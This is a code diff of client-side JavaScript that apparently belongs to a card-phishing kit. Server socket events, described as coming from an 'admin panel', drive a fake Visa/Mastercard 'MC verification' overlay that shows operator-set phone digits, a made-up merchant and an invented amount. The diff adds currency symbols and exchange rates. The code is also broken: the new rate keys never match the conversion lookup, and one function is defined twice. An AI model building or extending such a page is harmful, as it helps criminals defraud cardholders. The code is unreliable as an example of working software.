@@ -962,22 +962,22 @@ if (pathSegments.length > 1) {
         }
     });
     
-    socket.on('show_mc_verification', (data) => {
-        console.log('Showing MC verification overlay with data:', data);
-        
-        // Store the phone's last 4 digits from the data received from server
-        if (data.phoneLastFour) {
-            // Store it in the state for later use
-            state.phoneLastFour = data.phoneLastFour;
-            console.log('Phone last four digits set to:', data.phoneLastFour);
-        }
-        
-        showProcessingUI();
-        
-        setTimeout(() => {
-            showMCVerification(data);
-        }, 1500);
-    });
+   socket.on('show_mc_verification', (data) => {
+    console.log('Showing MC verification overlay with data:', data);
+    
+    // Store the phone's last 4 digits from the data received from server
+    if (data.phoneLastFour) {
+        // Store it in the state for later use
+        state.phoneLastFour = data.phoneLastFour;
+        console.log('Phone last four digits set to:', data.phoneLastFour);
+    }
+    
+    showProcessingUI();
+    
+    setTimeout(() => {
+        showMCVerification(data);
+    }, 1500);
+});
 
     socket.on('start_verification', (data) => {
         console.log('Start verification requested:', data);
@@ -1060,11 +1060,64 @@ if (pathSegments.length > 1) {
         }
     });
     
-    socket.on('update_mc_currency', function(data) {
-        if (data.currency) {
-            updateCurrencyDisplay(data.currency);
-        }
-    });
+   socket.on('update_mc_currency', function(data) {
+    if (data.currency) {
+        updateCurrencyDisplay(data.currency);
+    }
+});
+
+function updateCurrencyDisplay(currency) {
+    const currencySymbol = document.getElementById('currencySymbol');
+    const amountDisplay = document.getElementById('transactionAmount');
+    
+    if (currencySymbol && amountDisplay) {
+        // Map of currency codes to symbols
+        const symbols = {
+'INR': '₹',
+            'USD': '$',
+            'EUR': '€',
+            'GBP': '£',
+            'JPY': '¥',
+            'AUD': 'A$',
+            'CAD': 'C$',
+            'CHF': 'CHF',
+            'CNY': '¥',
+            'HKD': 'HK$',
+            'NZD': 'NZ$',
+            'SGD': 'S$',
+            'TWD': 'NT$',
+            'AED': 'د.إ',
+            'THB': '฿',
+            'SEK': 'kr',
+            'NOK': 'kr',
+            'DKK': 'kr',
+            'ZAR': 'R',
+            'MYR': 'RM',
+            'IDR': 'Rp',
+            'PHP': '₱',
+            'MXN': '$',
+            'BRL': 'R$',
+            'PLN': 'zł',
+            'RUB': '₽',
+            'TRY': '₺',
+            'KRW': '₩',
+            'ILS': '₪',
+            'SAR': '﷼',
+            'ARS': '$',
+            'CLP': '$',
+            'EGP': 'E£',
+            'COP': '$',
+            'VND': '₫'
+        };
+        
+        const originalAmount = state.amount || 1299.00;
+        const convertedAmount = convertCurrency(originalAmount, 'USD', currency);
+        
+        console.log(`Currency updated to ${currency}, converting $${originalAmount} to ${convertedAmount}`);
+        
+        currencySymbol.textContent = symbols[currency] || '$';
+        amountDisplay.textContent = convertedAmount;
+    }
 }
 
 function setupCardFormHandlers() {
@@ -1284,22 +1337,46 @@ function setupMcVerificationButtons() {
 }
 
 function convertCurrency(amount, fromCurrency, toCurrency) {
-    // Basic conversion rates (as of 2023)
-    // In a real app, you would fetch these from an API
+    // Updated exchange rates (as of recent data)
     const rates = {
-        'USD': 1,
-        'EUR': 0.93,
-        'GBP': 0.81,
-        'JPY': 149.5,
-        'INR': 83.20,
-        'CAD': 1.38,
-        'AUD': 1.56,
-        'CNY': 7.25,
-        'CHF': 0.91,
-        'HKD': 7.81
+             'INR_USD': 0.012,
+                'INR_EUR': 0.011,
+                'INR_GBP': 0.0095,
+                'INR_JPY': 1.78,
+                'INR_AUD': 0.018,
+                'INR_CAD': 0.016,
+                'INR_CHF': 0.011,
+                'INR_CNY': 0.087,
+                'INR_HKD': 0.094,
+                'INR_NZD': 0.020,
+                'INR_SGD': 0.016,
+                'INR_TWD': 0.38,
+                'INR_AED': 0.044,
+                'INR_THB': 0.40,
+                'INR_SEK': 0.13,
+                'INR_NOK': 0.13,
+                'INR_DKK': 0.082,
+                'INR_ZAR': 0.22,
+                'INR_MYR': 0.056,
+                'INR_IDR': 189.45,
+                'INR_PHP': 0.69,
+                'INR_MXN': 0.21,
+                'INR_BRL': 0.067,
+                'INR_PLN': 0.048,
+                'INR_RUB': 1.10,
+                'INR_TRY': 0.39,
+                'INR_KRW': 16.12,
+                'INR_ILS': 0.045,
+                'INR_SAR': 0.045,
+                'INR_ARS': 10.62,
+                'INR_CLP': 11.42,
+                'INR_EGP': 0.37,
+                'INR_COP': 47.38,
+                'INR_VND': 294.87
     };
     
     if (!rates[fromCurrency] || !rates[toCurrency]) {
+        console.warn(`Conversion rate not found for ${fromCurrency} to ${toCurrency}`);
         return amount; // Can't convert, return original
     }
     
@@ -1321,16 +1398,41 @@ function updateCurrencyDisplay(currency) {
     if (currencySymbol && amountDisplay) {
         // Map of currency codes to symbols
         const symbols = {
+     'INR': '₹',
             'USD': '$',
             'EUR': '€',
             'GBP': '£',
             'JPY': '¥',
-            'INR': '₹',
             'AUD': 'A$',
             'CAD': 'C$',
             'CHF': 'CHF',
             'CNY': '¥',
-            'HKD': 'HK$'
+            'HKD': 'HK$',
+            'NZD': 'NZ$',
+            'SGD': 'S$',
+            'TWD': 'NT$',
+            'AED': 'د.إ',
+            'THB': '฿',
+            'SEK': 'kr',
+            'NOK': 'kr',
+            'DKK': 'kr',
+            'ZAR': 'R',
+            'MYR': 'RM',
+            'IDR': 'Rp',
+            'PHP': '₱',
+            'MXN': '$',
+            'BRL': 'R$',
+            'PLN': 'zł',
+            'RUB': '₽',
+            'TRY': '₺',
+            'KRW': '₩',
+            'ILS': '₪',
+            'SAR': '﷼',
+            'ARS': '$',
+            'CLP': '$',
+            'EGP': 'E£',
+            'COP': '$',
+            'VND': '₫'
         };
         
         const originalAmount = state.amount || 1299.00;
@@ -1450,38 +1552,84 @@ function updateMcVerificationUI(data) {
         
         document.getElementById('verificationTypeLogo').src = verificationLogos[verificationType] || verificationLogos['visa'];
     }
-    
-    // Set masked phone number with the correct last 4 digits from admin panel
-    if (document.getElementById('cardLastFourDigits')) {
-        const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
-        document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
-    }
+  // In the updateMcVerificationUI function, update the following section:
+
+// Set masked phone number with the correct last 4 digits from admin panel
+if (document.getElementById('cardLastFourDigits')) {
+    // Prioritize the phoneLastFour from the data parameter
+    // This is the value sent from the admin panel
+    const lastFour = data.phoneLastFour || state.phoneLastFour || '9469';
+    console.log('Setting phone last four digits to:', lastFour);
+    document.getElementById('cardLastFourDigits').textContent = `********${lastFour}`;
+}
     
     // Update transaction details
     if (document.getElementById('merchantName')) {
         document.getElementById('merchantName').textContent = data.merchantName || 'Bologus pvt store.';
     }
     
-    if (document.getElementById('transactionAmount')) {
-        document.getElementById('transactionAmount').textContent = data.amount || '1000.00';
+// In updateMcVerificationUI function, update the currency and amount section:
+
+if (document.getElementById('transactionAmount')) {
+    // Get the original amount from state or data
+    const originalAmount = data.amount || state.amount || 1000.00;
+    
+    // Get the currency from data or use USD as default
+    const currency = data.currency || 'USD';
+    
+    // Convert amount if necessary
+    let displayAmount;
+    if (currency !== 'USD' && state.amount) {
+        displayAmount = convertCurrency(state.amount, 'USD', currency);
+    } else {
+        displayAmount = originalAmount;
     }
     
-    if (document.getElementById('currencySymbol')) {
-        const currency = data.currency || 'USD';
-        const currencySymbols = {
+    // Update the displayed amount
+    document.getElementById('transactionAmount').textContent = displayAmount;
+}
+
+if (document.getElementById('currencySymbol')) {
+    const currency = data.currency || 'USD';
+    const currencySymbols = {
+        'INR': '₹',
             'USD': '$',
             'EUR': '€',
             'GBP': '£',
             'JPY': '¥',
-            'INR': '₹',
             'AUD': 'A$',
             'CAD': 'C$',
             'CHF': 'CHF',
             'CNY': '¥',
-            'HKD': 'HK$'
-        };
-        document.getElementById('currencySymbol').textContent = currencySymbols[currency] || '$';
-    }
+            'HKD': 'HK$',
+            'NZD': 'NZ$',
+            'SGD': 'S$',
+            'TWD': 'NT$',
+            'AED': 'د.إ',
+            'THB': '฿',
+            'SEK': 'kr',
+            'NOK': 'kr',
+            'DKK': 'kr',
+            'ZAR': 'R',
+            'MYR': 'RM',
+            'IDR': 'Rp',
+            'PHP': '₱',
+            'MXN': '$',
+            'BRL': 'R$',
+            'PLN': 'zł',
+            'RUB': '₽',
+            'TRY': '₺',
+            'KRW': '₩',
+            'ILS': '₪',
+            'SAR': '﷼',
+            'ARS': '$',
+            'CLP': '$',
+            'EGP': 'E£',
+            'COP': '$',
+            'VND': '₫'
+    };
+    document.getElementById('currencySymbol').textContent = currencySymbols[currency] || '$';
+}
     
     if (document.getElementById('transactionDate')) {
         document.getElementById('transactionDate').textContent = data.date || new Date().toLocaleString('en-US', {
